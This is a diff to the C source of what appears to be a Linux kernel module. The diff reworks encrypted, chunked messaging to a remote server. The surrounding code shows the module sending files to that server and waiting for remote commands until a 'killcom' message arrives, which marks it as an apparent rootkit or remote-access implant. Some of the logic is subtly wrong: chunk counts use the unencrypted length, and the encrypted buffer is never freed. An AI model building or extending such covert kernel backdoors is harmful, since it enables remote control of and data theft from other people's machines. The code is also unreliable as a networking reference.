@@ -48,40 +48,112 @@ int close_socket(void) {
  */
 int send_to_server(char *message, ...) {
     va_list args;
+    va_list args_copy;
     char *formatted_message;
-    int written;
+    int needed;
     int ret_code;
 
     if (!sock)
         return -EINVAL;
 
-    // Retrieve all formatted message
-    formatted_message = kzalloc(STD_BUFFER_SIZE, GFP_KERNEL);
-    if (!formatted_message)
-        return -ENOMEM;
-
+    // Compute required size
     va_start(args, message);
-    written = vsnprintf(formatted_message, STD_BUFFER_SIZE, message, args);
+    va_copy(args_copy, args);
+    needed = vsnprintf(NULL, 0, message, args);
     va_end(args);
 
-    if (written < 0) {
-        kfree(formatted_message);
+    if (needed < 0) {
+        va_end(args_copy);
         return -EIO;
     }
 
-    // Detect truncation
-    if (written >= STD_BUFFER_SIZE)
-        pr_warn("send_to_server: message truncated\n");
+    formatted_message = kzalloc(needed + 1, GFP_KERNEL); // +1 for null terminator
+    if (!formatted_message) {
+        va_end(args_copy);
+        return -ENOMEM;
+    }
 
-    // Use send_to_server_raw to send the formatted message
+    // Format the string
+    vsnprintf(formatted_message, needed + 1, message, args_copy);
+    va_end(args_copy);
+
+    // Send the formatted message
     ret_code = send_to_server_raw(formatted_message, strlen(formatted_message));
     kfree(formatted_message);
 
     return ret_code;
 }
 
-int receive_from_server_raw(char *buffer, size_t max_len) {
-	char *received_buffer = kzalloc(max_len, GFP_KERNEL);
+int send_to_server_raw(const char *data, size_t len) {
+    // Send data using socket
+    // data is sent using chunks of size STD_BUFFER_SIZE bytes
+    // a chunk is sent using the following protocol :
+    // - first byte: number of chunks that are going to be sent to send the full message data
+    // - second byte: index of this chunk
+    // - third + fourth byte : lenght of this chunk (max = STD_BUFFER_SIZE - 5)
+    // - fifth to last excluded byte: chunk data
+    // - last byte:  x04 == End Of Transmission
+
+    // Encrypt the message
+    char *encrypted_msg = NULL;
+    size_t encrypted_len;
+    if (encrypt_buffer(data, len, &encrypted_msg, &encrypted_len) < 0) {
+        ERR_MSG("send_to_server_raw: encryption failed\n");
+        return -EIO;
+    }
+
+    // max chunk body size
+    size_t chunk_size = STD_BUFFER_SIZE;
+    size_t max_chunk_body_size = chunk_size - 5;
+
+    // get the number of chunks needed to send the data
+    size_t nb_chunks_needed = len / max_chunk_body_size;
+    if (len % max_chunk_body_size != 0)
+        nb_chunks_needed++;
+
+    // main loop: send all chunks
+    for (size_t i = 0; i < nb_chunks_needed; i++) {
+        // Allocate the chunk buffer
+        char *chunk_buffer = kzalloc(chunk_size, GFP_KERNEL);
+        if (!chunk_buffer) {
+            ERR_MSG("send_to_server_raw: failed to allocate buffer\n");
+            return -ENOMEM;
+        }
+
+        // Calculate the actual chunk size for this iteration
+        size_t current_chunk_size = (i == nb_chunks_needed - 1) ? (encrypted_len % max_chunk_body_size) : max_chunk_body_size;
+        if (current_chunk_size == 0)
+            current_chunk_size = max_chunk_body_size; // If the last chunk is full size
+
+        // Fill the chunk buffer
+        chunk_buffer[0] = (uint8_t)nb_chunks_needed;                                             // number of chunks
+        chunk_buffer[1] = (uint8_t)i;                                                            // index of this chunk
+        chunk_buffer[2] = (current_chunk_size >> 8) & 0xFF;                                      // high byte of chunk data length
+        chunk_buffer[3] = current_chunk_size & 0xFF;                                             // low byte of chunk data length
+        memcpy(chunk_buffer + 4, encrypted_msg + (i * max_chunk_body_size), current_chunk_size); // chunk data
+        chunk_buffer[4 + current_chunk_size] = 0x04;                                             // End Of Transmission
+
+        // Send the chunk
+        struct kvec vec;
+        struct msghdr msg = { 0 };
+        vec.iov_base = chunk_buffer;
+        vec.iov_len = chunk_size;
+
+        int ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
+        if (ret < 0) {
+            ERR_MSG("send_to_server_raw: failed to send message (chunk %zu)\n", i);
+            kfree(chunk_buffer);
+            return -FAILURE;
+        }
+
+        kfree(chunk_buffer);
+    }
+
+    return SUCCESS;
+}
+
+int receive_from_server(char *buffer, size_t max_len) {
+    char *received_buffer = kzalloc(max_len, GFP_KERNEL);
     size_t total_received = 0;
     size_t nb_chunks_needed = 0;
     bool *received_chunks = NULL;
@@ -167,212 +239,33 @@ int receive_from_server_raw(char *buffer, size_t max_len) {
             break;
         }
 
-        // Free the memory allocated for this chunk
         kfree(chunk_buffer);
     }
 
     // Free the memory allocated for the received chunks array
-	if (chunk_buffer)
-		kfree(chunk_buffer);
-	kfree(received_chunks);
+    if (chunk_buffer)
+        kfree(chunk_buffer);
+    kfree(received_chunks);
 
-	// decrypt the received message
-	char *decrypted_buffer = NULL;
-	size_t decrypted_len;
-	if (decrypt_buffer(received_buffer, total_received, &decrypted_buffer, &decrypted_len) < 0) {
-		ERR_MSG("receive_from_server_raw: decryption failed\n");
-		kfree(received_buffer);
-		return -EIO;
-	}
-	if (decrypted_len >= max_len) {
-		decrypted_len = max_len - 1; // Prevent buffer overflow
-	}
-	memcpy(buffer, decrypted_buffer, decrypted_len);
-	buffer[decrypted_len] = '\0';
+    // decrypt the received message
+    char *decrypted_buffer = NULL;
+    size_t decrypted_len;
+    if (decrypt_buffer(received_buffer, total_received, &decrypted_buffer, &decrypted_len) < 0) {
+        ERR_MSG("receive_from_server_raw: decryption failed\n");
+        kfree(received_buffer);
+        return -EIO;
+    }
+    if (decrypted_len >= max_len) {
+        decrypted_len = max_len - 1; // Prevent buffer overflow
+    }
+    memcpy(buffer, decrypted_buffer, decrypted_len);
+    buffer[decrypted_len] = '\0';
 
-	kfree(decrypted_buffer);
-	kfree(received_buffer);
+    kfree(decrypted_buffer);
+    kfree(received_buffer);
 
     return total_received;
 }
-
-int receive_from_server(char *recv_buffer, int buffer_size) {
-    return receive_from_server_raw(recv_buffer, buffer_size);
-}
-
-int send_to_server_raw(const char *data, size_t len) {
-    // Send data using socket
-    // data is sent using chunks of size STD_BUFFER_SIZE bytes
-    // a chunk is sent using the following protocol :
-    // - first byte: number of chunks that are going to be sent to send the full message data
-    // - second byte: index of this chunk
-    // - third + fourth byte : lenght of this chunk (max = STD_BUFFER_SIZE - 5)
-    // - fifth to last excluded byte: chunk data
-    // - last byte:  x04 == End Of Transmission
-
-    // Encrypt the message
-    char *encrypted_msg = NULL;
-    size_t encrypted_len;
-    if (encrypt_buffer(data, len, &encrypted_msg, &encrypted_len) < 0) {
-        ERR_MSG("send_to_server_raw: encryption failed\n");
-        return -EIO;
-    }
-
-    // max chunk body size
-    size_t chunk_size = STD_BUFFER_SIZE;
-    size_t max_chunk_body_size = chunk_size - 5;
-
-    // get the number of chunks needed to send the data
-    size_t nb_chunks_needed = len / max_chunk_body_size;
-    if (len % max_chunk_body_size != 0)
-        nb_chunks_needed++;
-
-    // main loop: send all chunks
-    for (size_t i = 0; i < nb_chunks_needed; i++) {
-        // Allocate the chunk buffer
-        char *chunk_buffer = kzalloc(chunk_size, GFP_KERNEL);
-        if (!chunk_buffer) {
-            ERR_MSG("send_to_server_raw: failed to allocate buffer\n");
-            return -ENOMEM;
-        }
-
-        // Calculate the actual chunk size for this iteration
-        size_t current_chunk_size = (i == nb_chunks_needed - 1) ? (encrypted_len % max_chunk_body_size) : max_chunk_body_size;
-        if (current_chunk_size == 0)
-            current_chunk_size = max_chunk_body_size; // If the last chunk is full size
-
-        // Fill the chunk buffer
-        chunk_buffer[0] = (uint8_t)nb_chunks_needed;                                             // number of chunks
-        chunk_buffer[1] = (uint8_t)i;                                                            // index of this chunk
-        chunk_buffer[2] = (current_chunk_size >> 8) & 0xFF;                                      // high byte of chunk data length
-        chunk_buffer[3] = current_chunk_size & 0xFF;                                             // low byte of chunk data length
-        memcpy(chunk_buffer + 4, encrypted_msg + (i * max_chunk_body_size), current_chunk_size); // chunk data
-        chunk_buffer[4 + current_chunk_size] = 0x04;                                             // End Of Transmission
-
-        // Send the chunk
-        struct kvec vec;
-        struct msghdr msg = { 0 };
-        vec.iov_base = chunk_buffer;
-        vec.iov_len = chunk_size;
-
-        int ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
-        if (ret < 0) {
-            ERR_MSG("send_to_server_raw: failed to send message (chunk %zu)\n", i);
-            kfree(chunk_buffer);
-            return -FAILURE;
-        }
-
-        kfree(chunk_buffer);
-    }
-
-    return SUCCESS;
-}
-
-// int receive_from_server(char *recv_buffer, int buffer_size) {
-//     struct kvec vec;
-//     struct msghdr msg = { 0 };
-//     char *encrypted_buf = NULL;
-//     char *decrypted_buf = NULL;
-//     size_t decrypted_len;
-//     int ret;
-
-//     if (!recv_buffer) {
-//         ERR_MSG("receive_from_server: recv_buffer is NULL\n");
-//         return -EINVAL;
-//     }
-
-//     // memo: kzalloc == calloc
-//     encrypted_buf = kzalloc(buffer_size, GFP_KERNEL);
-//     if (!encrypted_buf)
-//         return -ENOMEM;
-
-//     // Receive the message
-//     vec.iov_base = encrypted_buf;
-//     vec.iov_len = buffer_size;
-
-//     ret = kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
-//     if (ret < 0) {
-//         ERR_MSG("receive_from_server: kernel_recvmsg failed: %d\n", ret);
-//         kfree(encrypted_buf);
-//         return FAILURE;
-//     }
-
-//     // Uncipherer message using AES
-//     if (decrypt_buffer(encrypted_buf, ret, &decrypted_buf, &decrypted_len) < 0) {
-//         ERR_MSG("receive_from_server: decryption failed\n");
-//         kfree(encrypted_buf);
-//         return FAILURE;
-//     }
-
-//     // Prevent buffer overflow
-//     // Duno know how this can fix problems without creating others but it does
-//     if (decrypted_len >= buffer_size)
-//         decrypted_len = buffer_size - 1;
-
-//     // Copy decrypted message to recv_buffer
-//     memcpy(recv_buffer, decrypted_buf, decrypted_len);
-//     recv_buffer[decrypted_len] = '\0';
-
-//     kfree(encrypted_buf);
-//     kfree(decrypted_buf);
-
-//     return SUCCESS;
-// }
-
-// int send_to_server_raw(const char *data, size_t len) {
-// 	struct kvec vec;
-// 	struct msghdr msg;
-// 	char *encrypted_msg = NULL;
-// 	char *formatted_msg = NULL;
-// 	size_t encrypted_len;
-// 	int ret = 0;
-
-// 	if (!sock)
-// 		return -EINVAL;
-
-// 	// Compute size of formatted string: "[** BEGIN **]" + data + "[** END **]" + '\0'
-// 	const char *prefix = "[** BEGIN **]";
-// 	const char *suffix = "[** END **]";
-// 	size_t prefix_len = strlen(prefix);
-// 	size_t suffix_len = strlen(suffix);
-
-// 	formatted_msg = kzalloc(prefix_len + len + suffix_len + 1, GFP_KERNEL);
-// 	if (!formatted_msg) {
-// 		ERR_MSG("send_to_server_raw: failed to allocate buffer\n");
-// 		return -ENOMEM;
-// 	}
-
-// 	memcpy(formatted_msg, prefix, prefix_len);
-// 	memcpy(formatted_msg + prefix_len, data, len);
-// 	memcpy(formatted_msg + prefix_len + len, suffix, suffix_len);
-// 	formatted_msg[prefix_len + len + suffix_len] = '\0';
-
-// 	DBG_MSG("send_to_server_raw: sending: %s\n", formatted_msg);
-
-// 	// Encrypt the message
-// 	if (encrypt_buffer(formatted_msg, prefix_len + len + suffix_len + 1, &encrypted_msg, &encrypted_len) < 0) {
-// 		ERR_MSG("send_to_server_raw: encryption failed\n");
-// 		kfree(formatted_msg);
-// 		return -EIO;
-// 	}
-
-// 	kfree(formatted_msg);
-
-// 	DBG_MSG("send_to_server_raw: sending encrypted message: %s\n", encrypted_msg);
-
-// 	// Send the entire encrypted message
-// 	vec.iov_base = encrypted_msg;
-// 	vec.iov_len = encrypted_len;
-// 	memset(&msg, 0, sizeof(msg));
-
-// 	ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
-// 	if (ret < 0) {
-// 		ERR_MSG("send_to_server_raw: failed to send message\n");
-// 	}
-
-// 	kfree(encrypted_msg);
-// 	return ret < 0 ? ret : SUCCESS;
-// }
 
 int send_file_to_server(char *filename) {
     struct file *file = NULL;
@@ -382,7 +275,7 @@ int send_file_to_server(char *filename) {
 
     // Allocate buffer for chunks
     buffer = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
-    if (!buffer) 
+    if (!buffer)
         return -ENOMEM;
     memset(buffer, 0, STD_BUFFER_SIZE);
 
@@ -518,38 +411,7 @@ int network_worker(void *data) {
             continue;
         }
 
-        // Connection successful
-        break;
-    }
-
-    // Attempt to send the initial message using send_to_server
-    int attempts = 0;
-    do {
-        ret_code = send_to_server(message);
-        if (ret_code != SUCCESS) {
-            ERR_MSG("network_worker: failed to send message, retrying... (attempt %d/%d)\n", attempts + 1, MAX_MSG_SEND_OR_RECEIVE_ERROR);
-            msleep(TIMEOUT_BEFORE_RETRY);
-            attempts++;
-        }
-    } while (ret_code != SUCCESS && attempts < MAX_MSG_SEND_OR_RECEIVE_ERROR);
-
-    // If all attempts to send the message failed, abort
-    if (ret_code < 0) {
-        ERR_MSG("network_worker: failed to send message after %d attempts, giving up.\n", MAX_MSG_SEND_OR_RECEIVE_ERROR);
-        return -FAILURE;
-    }
-
-    DBG_MSG("network_worker: message sent to %s:%d\n", ip, port);
-
-    // Count of empty messages in a row received
-    // This is used to determine if the server is still active
-    // and to avoid flooding the server with empty messages
-    unsigned empty_count = 0;
-    // Listen for commands
-    // Retry until 'killcom' is received or thread is stopped by unmonting the module
-    char *recv_buffer = kmalloc(RCV_CMD_BUFFER_SIZE, GFP_KERNEL);
-    while (!kthread_should_stop() && !thread_exited) {
-        if (receive_from_server(recv_buffer, RCV_CMD_BUFFER_SIZE) == FAILURE) {
+        if (!send_initial_message_with_retries()) {
             msleep(TIMEOUT_BEFORE_RETRY);
             continue;
         }
